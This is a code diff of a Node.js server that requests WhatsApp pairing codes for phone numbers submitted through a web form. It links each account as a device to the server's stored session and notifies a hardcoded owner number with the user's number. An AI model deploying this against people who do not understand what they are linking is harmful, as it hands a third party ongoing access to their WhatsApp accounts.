@@ -1,33 +1,27 @@
 /**
- * Jinx4G Mini Phone Server
- * WhatsApp mini-device linking + auto "Jinx4G Connected" message
+ * Jinx4G Mini Phone - Railway-ready
  */
 
 const express = require("express");
 const crypto = require("crypto");
 const path = require("path");
-const {
-  default: makeWASocket,
-  useMultiFileAuthState,
-  DisconnectReason
-} = require("@whiskeysockets/baileys");
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require("@whiskeysockets/baileys");
 
 const app = express();
-app.use(express.json());
-app.use(express.static("public"));
 
-let sock;                 // WhatsApp socket
+// Increase JSON limit for Baileys large payloads
+app.use(express.json({ limit: "10mb" }));
+app.use(express.urlencoded({ extended: true, limit: "10mb" }));
+
+// Config
+const ownerNumber = "YOUR_NUMBER_WITH_COUNTRY_CODE"; // replace with your number
+let sock;
 let pairingInProgress = false;
-let targetNumber = null;   // Number being linked
-const ownerNumber = "YOUR_NUMBER_WITH_COUNTRY_CODE"; // Replace with your number
+let targetNumber = null;
 
-/**
- * Start mini-device pairing
- */
+// Start mini-device pairing
 async function startMiniDevice(phoneNumber) {
-  if (pairingInProgress) {
-    throw new Error("Pairing already in progress. Try again later.");
-  }
+  if (pairingInProgress) throw new Error("Pairing already in progress");
 
   pairingInProgress = true;
   targetNumber = phoneNumber.replace(/[^0-9]/g, "");
@@ -50,10 +44,12 @@ async function startMiniDevice(phoneNumber) {
 
       const sessionId = "Jinx4G-MD." + crypto.randomBytes(10).toString("hex");
 
-      // Send message to owner
+      // Send message to owner only
       await sock.sendMessage(
         `${ownerNumber}@s.whatsapp.net`,
-        { text: `📱 Mini Phone Linked!\nUser: ${targetNumber}\nSession ID: ${sessionId}\nJinx4G Connected` }
+        {
+          text: `📱 Mini Phone Linked!\nUser: ${targetNumber}\nSession ID: ${sessionId}\nJinx4G Connected`
+        }
       );
 
       pairingInProgress = false;
@@ -63,14 +59,12 @@ async function startMiniDevice(phoneNumber) {
     if (connection === "close") {
       pairingInProgress = false;
       const reason = lastDisconnect?.error?.output?.statusCode;
-      if (reason !== DisconnectReason.loggedOut) {
-        console.log("🔁 Socket closed unexpectedly, ready for next pairing");
-      }
+      if (reason !== DisconnectReason.loggedOut) console.log("🔁 Socket closed unexpectedly");
     }
   });
 
   if (!sock.authState.creds.registered) {
-    // Request WhatsApp pairing code
+    // Only send minimal info to frontend
     const pairCode = await sock.requestPairingCode(targetNumber);
     return pairCode;
   } else {
@@ -79,10 +73,8 @@ async function startMiniDevice(phoneNumber) {
   }
 }
 
-/**
- * API: POST /pair → generate pairing code
- */
-app.post("/pair", async (req, res) => {
+// API endpoint
+app.post("/api/pair", async (req, res) => {
   const { phone } = req.body;
   if (!phone) return res.status(400).json({ error: "Phone number required" });
 
@@ -90,10 +82,17 @@ app.post("/pair", async (req, res) => {
     const code = await startMiniDevice(phone);
     res.json({ pairCode: code });
   } catch (err) {
-    console.error(err);
+    console.error(err.message); // minimal logging
     res.status(500).json({ error: err.message || "Failed to generate pair code" });
   }
 });
 
+// Serve frontend
+app.use(express.static(path.join(__dirname, "public")));
+app.get("*", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "index.html"));
+});
+
+// Start server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`🌊 Jinx4G Mini Phone server running on port ${PORT}`));
